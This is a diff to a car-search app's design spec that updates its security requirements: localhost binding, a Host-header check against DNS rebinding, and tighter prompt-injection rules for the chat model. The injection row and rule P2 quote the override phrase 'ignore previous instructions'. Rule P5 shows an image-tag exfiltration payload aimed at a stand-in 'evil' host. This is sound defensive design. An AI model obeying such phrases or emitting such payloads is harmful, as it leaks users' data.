@@ -81,13 +81,13 @@ We've collected a list of 673 car models, but nothing uses it yet. This slice tu
 
 ## Security and safety
 
-What could go wrong, in plain terms, and what we do about it. The engineering requirements behind each row are in the appendix (S1–S10, P1–P7).
+What could go wrong, in plain terms, and what we do about it. The engineering requirements behind each row are in the appendix (S1–S10, S17, P1–P7).
 
 | What could go wrong | What we do |
 |---|---|
 | **Someone runs up our AI bill** by sending lots of searches | The AI key gets a hard monthly spending cap and can only call the services we use. Searches have length limits. The app runs only on this computer until it has login or usage limits |
-| **A website you visit quietly uses your running app** to make searches on your dime | The app only accepts requests made by its own page and rejects the kinds a hostile website can send |
-| **The database is reachable by other devices** on your network | The database only accepts connections from this computer |
+| **A website you visit quietly uses your running app** to make searches on your dime | The app only accepts requests made by its own page, rejects the kinds a hostile website can send, and only answers requests addressed to this computer by name, so a website can't disguise itself as the app |
+| **The database or the app is reachable by other devices** on your network | Both only accept connections from this computer, including production builds |
 | **Secrets leak** (AI key, database address) | They live only on the server and in an uncommitted file. We checked: no secret has ever been committed |
 | **Malicious text shows up on the page** (from a request or the data) | The page always shows text as plain text, never as live web code |
 | **Prompt injection**: tricking an AI with instructions hidden in text ("ignore your rules and…") | **Searches:** not a risk. The search AI only measures meaning and can't follow instructions. **Descriptions:** a small risk, at setup time only. The AI that writes them reads car names from an outside database, so it follows the injection rules (P1–P6): it can't *do* anything, the names are marked as data, its answers must fit a strict format, and anything with web code or links, or for a car we didn't ask about, is thrown away. Visitors' searches never reach it |
@@ -229,7 +229,7 @@ How it's built. For how to call it (examples, every error), see the [API referen
 </details>
 
 <details>
-<summary>Security requirements for this slice (S1–S10)</summary>
+<summary>Security requirements for this slice (S1–S10, S17)</summary>
 
 | # | Requirement | Why |
 |---|---|---|
@@ -242,9 +242,10 @@ How it's built. For how to call it (examples, every error), see the [API referen
 | S7 | Render text only with `{{ }}`. No `v-html` anywhere; turn on `vue/no-v-html` as a lint error | Vue escapes interpolation; `v-html` is the XSS hole, and it gets tempting once AI output arrives |
 | S8 | Scraper: check that `MakeId` and `year` are integers before building cache file paths | API data is untrusted input, and it's used to build filesystem paths (path traversal if it were ever `"../.."`) |
 | S9 | Dependencies: the lockfile is committed; run `pnpm audit` on upgrades; keep pnpm 10's default of not running dependency install scripts | Audit 2026-11-17: 5 findings (1 low, 2 moderate, 2 high) in esbuild (Windows dev server only), glob, minimatch and picomatch, all in build, lint and font tooling, none in the request path. Dependabot (weekly, since 2026-11-16) opens PRs as upstream fixes land |
-| S10 | Dev server stays on localhost: no `--host`, no `NUXT_HOST=0.0.0.0` | A dev server holding a live API key shouldn't be reachable from the network |
+| S10 | Every server stays on localhost. Dev: no `--host`, no `NUXT_HOST=0.0.0.0`. **Production builds too** (added 2026-11-17): run them with `pnpm start` or `pnpm preview`, which set `NITRO_HOST=127.0.0.1`; never bare `node .output/server/index.mjs` | A server holding a live API key shouldn't be reachable from the network. Nitro's production server listens on every interface unless `NITRO_HOST` or `HOST` is set |
+| S17 | **Localhost only, by `Host` header** (added 2026-11-17): `server/middleware/local-only.ts` answers 403 to any request whose `Host` isn't `localhost`, `127.0.0.1` or `[::1]` (any port; `[::1]` only reaches `pnpm dev`, since production builds listen on 127.0.0.1). Requests with no `Host` pass: only Nitro's own internal calls lack one, since browsers always send it and Node answers 400 to outside requests without it | DNS rebinding: a website points its own domain at 127.0.0.1, and the browser then treats our API as same-origin, so S1's JSON rule no longer keeps it out. Its requests still carry the attacker's hostname. Matters more once chat calls (50 a day) are behind the API |
 
-**Before anything is public:** login or per-IP rate limiting (the `nuxt-security` module provides a rate limiter, CSP and security headers), budget alerts on the OpenAI project, and a review of S1–S10 against the deployed setup.
+**Before anything is public:** login or per-IP rate limiting (the `nuxt-security` module provides a rate limiter, CSP and security headers), budget alerts on the OpenAI project, S17's allowed hosts set to the real domain, and a review of S1–S10 and S17 against the deployed setup.
 
 </details>
 
@@ -257,7 +258,7 @@ Search itself doesn't need them: embedding models turn text into numbers and don
 |---|---|---|
 | P1 | **Least privilege:** the chat model gets no tools, no database access, no secrets and no URLs to fetch | The main defense. If the model can't *do* anything, the worst an injection achieves is odd text |
 | P2 | **Role separation:** rules go only in the system message. The user query and retrieved cars go in the user message, inside clearly labelled delimiters and marked as data. User text is never interpolated into the system prompt | Makes "ignore previous instructions" much weaker, and keeps our rules out of the attacker's reach |
-| P3 | **Structured output:** the model returns JSON matching a schema, `{ noneFit: boolean, picks: [{ carId, reason }] }` (shape set in the [G spec](generate.md), decision 4). The server drops any `carId` not in the retrieved set, rejects contradictions (`noneFit` with picks, or neither), and caps each reason's length | The model can't recommend a car we didn't retrieve, or smuggle in arbitrary content |
+| P3 | **Structured output:** the model returns JSON matching a schema, `{ noneFit: boolean, picks: [{ carId, reason }] }` (shape set in the [G spec](generate.md), decision 4). The server **drops the whole answer** if any `carId` isn't in the retrieved set, if a reason names a catalog car that wasn't retrieved (make + model, or the model alone unless it's an everyday word), or if it contradicts itself (`noneFit` with picks, or neither); it also caps each reason's length | The model can't recommend a car we didn't retrieve, or smuggle in arbitrary content |
 | P4 | **Retrieved data is untrusted too** (indirect injection): car names come from an external API; generated descriptions (if we enrich) are stored and reviewable; nothing is fetched from the web at query time | Injection can come from the data, not just the user |
 | P5 | **Output renders as plain text.** If we ever render markdown, sanitize it and disallow images and links | Model output with `<img src="https://evil/?q=…">` is both XSS and a data exfiltration channel |
 | P6 | **Limits:** `max_tokens` on responses, the 500-character input cap, request timeouts | Caps cost and the blast radius of a runaway reply |
